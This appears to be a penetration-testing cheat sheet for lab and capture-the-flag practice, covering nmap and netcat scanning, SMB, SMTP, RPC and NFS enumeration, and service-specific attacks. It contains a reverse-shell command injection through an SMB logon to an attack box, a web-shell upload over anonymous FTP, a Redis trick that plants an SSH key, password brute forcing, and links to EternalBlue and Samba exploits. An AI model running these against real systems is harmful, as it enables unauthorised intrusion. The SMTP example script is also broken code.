[+] Grab HTTP Headers
curl -LIN <host>

[+] Quickly generate an MD5 hash for a text string using OpenSSL
echo -n 'text to be encrypted' | openssl md5

[+] Shutdown a Windows machine from Linux
net rpc shutdown -I ipAddressOfWindowsPC -U username%password

[+] Conficker Detection with NMAP
nmap -PN -d -p445 --script=smb-check-vulns --script-args=safe=1 IP-RANGES

[+] Determine if a port is open with bash
(: </dev/tcp/127.0.0.1/80) &>/dev/null && echo "OPEN" || echo "CLOSED"
```

### Port Scanning

#### Connect Scanning

* The simplest TCP port scanning technique, usually called CONNECT scanning, relies on the three-way TCP handshake mechanism.
* Connect port scanning involves attempting to complete a three-way handshake with the target host on the specified port(s).
* If the handshake is completed, this indicates that the port is open.

```
# TCP Netcat port scan on ports 3388-3390
> nc -nvv -w 1 -z 10.0.0.19 3388-3390
# -n :: numeric only ip adressess no DNS
# -v :: verboose use twice to be more verboose
# -w :: (secs) timeout for connects and final net reads
# -z :: zero I/O mode (used for scanning)
```

#### Stealth / SYN Scanning

* SYN scanning, or stealth scanning, is a TCP port scanning method that involves sending SYN packets to various ports on a target machine without completing a TCP handshake.
* If a TCP port is open, a SYN-ACK should be sent back from the target machine, informing us that the port is open, without the need to send a final ACK back to the target machine.
* With early and primitive firewalls, this method would often bypass firewall logging, as this logging was limited to completed TCP sessions.
* This is no longer true with modern firewalls, and the term stealth is misleading. Users might believe their scans will somehow not be detected, when in fact, they will be.

#### UDP Scanning

```
> nc -nv -u -z -w 1 10.0-0.19 160-162
# -u :: UDP mode
```

#### Common Port Scanning Pitfalls

* UDP port scanning is often unreliable, as firewalls and routers may drop ICMP packets. This can lead to false positives in your scan, and you will regularly see UDP port scans showing all UDP ports open on a scanned machine.
* Most port scanners do not scan all available ports, and usually have a preset list of “interesting ports” that are scanned.
* People often forget to scan for UDP services, and stick only to TCP scanning, thereby seeing only half of the equation.

#### Port Scanning with Nmap

* A default nmap TCP scan will scan the 1000 most popular ports on a given machine.

```
# We’ll scan one of my local machines while monitoring the amount
# of traffic sent to the specific host using iptables.
> iptables -I INPUT 1 -s 10.0.0.19 -j ACCEPT
> iptables -I OUTPUT 1 -d 10.0.0.19 -j ACCEPT
> iptables -Z
# -I :: insert in chain as rulenum ( default 1=first)
# -s :: source (address)
# -j :: jump target for the rulw
# -Z :: ??

> nmpap -sT 10.0.0.9
> iptables -vn -L
> iptables -Z
# -sT :: TCP Connect Scan
# -v :: Display more information in the output
# -L :: List the current filter rules.

> nmap -sT -p 1-65635 10.0.0.19
> iptables -vn -L
# -p :: port range
```

* This default 1000 port scan has generated around 72KB of traffic.
* A similar local port scan explicitly probing all 65535 ports would generate about 4.5 MB of traffic, a significantly higher amount.
* However, this full port scan has discovered two new ports that were not found by the default TCP scan: ports 180 and 25017.

\--Full nmap scan of a class C network (254 hosts) would result in sending over 1000 MB of traffic to the network.--

**So, if we are in a position where we can’t run a full port scan on the network, what can we do?**

#### Network Sweeping

* To deal with large volumes of hosts, or to otherwise try to conserve network traffic, we can attempt to probe these machines using Network Sweeping techniques.
* Machines that filter or block ICMP requests may seem down to a ping sweep, so it is not a definitive way to identify which machines are really up or down.

```
> nmap -sP 192.168.1.0/24 ## Deprecated in modern versions Use -sn instead
Show ips of connected devices

> nmap -sn 192.168.11.200-250
# -sn :: ping scan
# using the grep command can give you output that’s difficult to manage.
# let’s use Nmap’s “greppable” output parameter (-oG)
> nmap -v -sn 192.168.11.200-250 -oG ping-sweep.txt
> grep Up ping-sweep.txt | cut -d " " -f 2

# we can sweep for specific TCP or UDP ports (-p) across the network
> nmap ­-p 80 192.168.11.200-250 -oG web-sweep.txt
> grep open web­-sweep.txt |cut ­-d " " -f 2

# we are conducting a scan for the top 20 TCP ports.
> nmap –sT –A --top­-ports=20 192.168.11.200-250 –oG top­-port-­sweep.txt
```

* Machines that prove to be rich in services, or otherwise interesting, would then be individually port scanned, using a more exhaustive port list.

#### OS Fingerprinting

```
# OS fingerprinting (-O parameter).
> nmap -O 10.0.0.19
```

#### Banner Grabbing/Service Enumeration

Nmap can also help identify services on specific ports, by banner grabbing, and running several enumeration scripts (-sV and -A parameters).

```
> nmap -sV -sT 10.0.0.19
# -sV :: probe open ports to determine service / version info
```

#### Nmap Scripting Engine (NSE)

* The scripts include a broad range of utilities, from DNS enumeration scripts, brute force attack scripts, and even vulnerability identification scripts.
* All NSE scripts can be found in the /usr/share/nmap/scripts directory

```
> nmap 10.0.0.19 --script smb-os-discovery.nse
# Another useful script is the DNS zone transfer NSE script
> nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

#### SMB Enumeration

```
SMB1   – Windows 2000, XP and Windows 2003.
SMB2   – Windows Vista SP1 and Windows 2008
SMB2.1 – Windows 7 and Windows 2008 R2
SMB3   – Windows 8 and Windows 2012.
```

**Scanning for the NetBIOS Service**

*   The SMB NetBIOS32 service listens on TCP ports 139 and 445, as well as several UDP ports.

    ```
    > nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254
    ```
*   There are other, more specialized, tools for specifically identifying NetBIOS information

    ```
    > nbtscan -r 192.168.11.0/24
    ```

**Null Session Enumeration**

* A null session refers to an unauthenticated NetBIOS session between two computers. This feature exists to allow unauthenticated machines to obtain browse lists from other Microsoft servers.
* A null session also allows unauthenticated hackers to obtain large amounts of information about the machine, such as password policies, usernames, group names, machine names, user and host SIDs.
* This Microsoft feature existed in SMB1 by default and was later restricted in subsequent versions of SMB.

```
> enum4linux -a 192.168.11.227
```

**Nmap SMB NSE Scripts**

```
# These scripts can be found in the /usr/share/nmap/scripts directory
> ls -l /usr/share/nmap/scripts/smb-
# We can see that several interesting Nmap SMB NSE scripts exist,, such as OS discovery
# and enumeration of various pieces of information from the protocol
> nmap -v -p 139, 445 --script=smb-os-discovery 192.168.11.227
# To check for known SMB protocol vulnerabilities,
# you can invoke the nmap smb-check-vulns script
> nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.11.201
```

**SMTP Enumeration**

* mail servers can also be used to gather information about a host or network.
* SMTP supports several important commands, such as VRFY and EXPN.
* A VRFY request asks the server to verify an email address
* while EXPN asks the server for the membership of a mailing list.
* These can often be abused to verify existing users on a mail server, which can later aid the attacker.

```
# This procedure can be used to help guess valid usernames.
> nc -nv 192.168.11.215 25
```

* Examine the following simple Python script that opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username.

```
# !/usr/bin/python
import socket
import sys

if len(sys.argv) != 2:
  print "Usage: vrfy.py <username>"
  sys.exit(0)

# Create a Socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
connect=s.connect(('192.168.11.215',25))

# Receive the banner
banner=s.recv(1024)
print banner

# VRFY a user
s.send('VRFY' - sys.argv[1] - '\r\n')
result=s.recv(1024)
print result

# Close the socket
s.close()
```

## -----

**Port Scanning :**

```
nmap -sC -sV -o nmap -A -T5 10.10.10.x

Host Discovery
   •  nmap -sn 10.10.1.1-254 -vv -oA hosts
   •  netdiscover -r 10.10.10.0/24

DNS server discovery
   •  nmap -p 53 10.10.10.1-254 -vv -oA dcs
   
NSE Scripts Scan 
   * nmap -sV --script=vulscan/vulscan.nse (https://securitytrails.com/blog/nmap-vulnerability-scan)
   
Port specific NSE script list :

   ls /usr/share/nmap/scripts/ssh*
   ls /usr/share/nmap/scripts/smb*
```

**Scanning all 65535 ports :**

```
masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports 10.10.10.x

Running specific NSE scripts :
    nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A
```

Optional - **sT** (performs full TCP handshake scan instead of syn-scan to prevent getting flagged by firewalls)

From Apache Version to finding Ubuntu version -> ubuntu httpd versions

**FTP : (Port 21)**

* anonymous login check&#x20;
  * ftp \<ip address>
  * username : anonymous
  * pwd : anonymous
  * file upload -> put shell.php

**SSH : (Port 22)**

**id\_rsa.pub : Public key that can be used in authorized\_keys for login**

**id\_rsa** : Private key that is used for login. Might ask for password. can be cracked with `ssh2john` and john

* id\_rsa
* ssh -i id\_rsa user@10.10.10.x
* For passwordless login, add id\_rsa.pub to target's authorized\_keys
* ssh2john

**DNS Zone transfer check : (Port 53)**

* If port 53 is open
* Add host to /etc/hosts
* dig axfr smasher.htb @10.10.10.135
* [https://ghostphisher.github.io/smasher2](https://ghostphisher.github.io/smasher2)
* Add the extracted domain to /etc/hosts and dig again

**RPC Bind (111)**

```
rpcclient --user="" --command=enumprivs -N 10.10.10.10
rpcinfo –p 10.10.10.10
rpcbind -p 10.10.10.10 
```

**RPC (135)**

```
rpcdump.py 10.11.1.121 -p 135
rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np // get pipe names

rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
```

**SMB (139 & 445)**

****[**https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html**](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)****

```
nmap --script smb-protocols 10.10.10.10

smbclient -L //10.10.10.10
smbclient -L //10.10.10.10 -N         // No password (SMB Null session)
smbclient --no-pass -L 10.10.10.10
smbclient //10.10.10.10/share_name

smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -s share_name 

crackmapexec smb 10.10.10.10 -u '' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name

enum4linux -a 10.10.10.10

rpcclient -U "" 10.10.10.10
    * enumdomusers 
    * enumdomgroups
    * queryuser [rid]
    * getdompwinfo
    * getusrdompwinfo [rid]

ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v

mount -t cifs "//10.1.1.1/share/" /mnt/wins

mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0

SMB Shell to Reverse Shell : 

    smbclient -U "username%password" //192.168.0.116/sharename
    smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash" 
    
Checklist :
    * Samba symlink directory traversal attack
```

**SMB Exploits :**

* Samba "username map script" Command Execution - CVE-2007-2447
  * Version **3.0.20** through **3.0.25rc3**
  * Samba-usermap-exploit.py - [https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
* Eternal Blue - CVE-2017-0144
  * SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016
  * [https://github.com/adithyan-ak/MS17-010-Manual-Exploit](https://github.com/adithyan-ak/MS17-010-Manual-Exploit)
* SambaCry - CVE-2017-7494
  * **4.5.9** version and before
  * [https://github.com/opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)
*

**IRC (194,6667,6660-7000)**

* nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
* ****[**https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor**](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) **(exploit code)**

**NFS (2049)**

* showmount -e 10.1.1.27
* mkdir /mnt/nfs
* mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
* Permission Denied ? ([https://blog.christophetd.fr/write-up-vulnix/](https://blog.christophetd.fr/write-up-vulnix/))

**MYSQL (3306)**

* nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

**Redis (6379)**

In the output of config get \* you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated\_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:&#x20;

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
2. Write the public key to a file : `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`
3. Import the file into redis : `cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit`&#x20;
4. Save the public key to the `authorized_keys` file on redis server:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /home/test/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

**Port Knocking :**

```
TCP
knock -v 192.168.0.116 4 27391 159

UDP
knock -v 192.168.0.116 4 27391 159 -u

TCP & UDP
knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
```

